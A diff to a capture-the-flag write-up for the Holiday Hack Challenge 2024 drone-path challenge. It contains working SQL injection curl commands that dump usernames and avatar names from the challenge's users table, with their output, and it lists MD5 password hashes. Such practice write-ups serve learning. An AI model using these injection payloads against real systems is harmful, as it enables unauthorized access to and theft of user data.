@@ -46,7 +46,7 @@ As the [search function](https://hhc24-dronepath.holidayhackchallenge.com/worksh
 
 It is possible to pull out all user details:
 
-`
+```
 curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Zapper'%20UNION%20SELECT%20username%2c1%2c1%20FROM%20users%3b--"
 [{"name":"Zapper","quantity":"5","weapons":"CarrotSpike"},{"name":"brynne","quantity":1,"weapons":1},{"name":"filo","quantity":1,"weapons":1},{"name":"fritjolf","quantity":1,"weapons":1},{"name":"lira","quantity":1,"weapons":1},{"name":"pip","quantity":1,"weapons":1},{"name":"sprigg","quantity":1,"weapons":1},{"name":"tylwen","quantity":1,"weapons":1}]
 
@@ -55,7 +55,7 @@ curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Za
 
 curl "https://hhc24-dronepath.holidayhackchallenge.com//api/v1.0/drones?drone=Zapper'%20UNION%20SELECT%20avatar%2c1%2c1%20FROM%20users%3b--"
 [{"name":"2cf1d29136d246eeb42149e65358abb3.png","quantity":1,"weapons":1},{"name":"Zapper","quantity":"5","weapons":"CarrotSpike"},{"name":"elf13.png","quantity":1,"weapons":1},{"name":"elf17.png","quantity":1,"weapons":1},{"name":"elf23.png","quantity":1,"weapons":1},{"name":"elf3.png","quantity":1,"weapons":1},{"name":"elf5.png","quantity":1,"weapons":1},{"name":"elf6.png","quantity":1,"weapons":1}]
-`
+```
 
 So we have the Elf "fritjolf" and the Troll "Pip":
 |User|Avatar|Password MD5|Password clear|
@@ -69,9 +69,17 @@ brynne, lira, sprigg, tylwen
 
 using the MD5 password hashes:
 
-2fd03c8ea542a7fd85ca4ebbcc13d5ca, 3c3a4f722ec77c1712941003443a4d83, 4f7f1b7c49fa2b0cc22e2d2599f1f2e5, 9eb6c13b1b18bc785ffb84d977bf5499, 
+2fd03c8ea542a7fd85ca4ebbcc13d5ca, 3c3a4f722ec77c1712941003443a4d83, 4f7f1b7c49fa2b0cc22e2d2599f1f2e5, 9eb6c13b1b18bc785ffb84d977bf5499, b9af6f935826ae1a89ecba72476fbcba
+
+and the Avatars:
+
+elf13.png, 
+elf17.png, 
+elf3.png, 
+elf6.png, 
+
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTYzNTE1MjcyMiwyMDgzMTI5NzA5LDQyOT
+eyJoaXN0b3J5IjpbLTQ0MDQxMzYxNiwyMDgzMTI5NzA5LDQyOT
 g3MDk2NV19
 -->
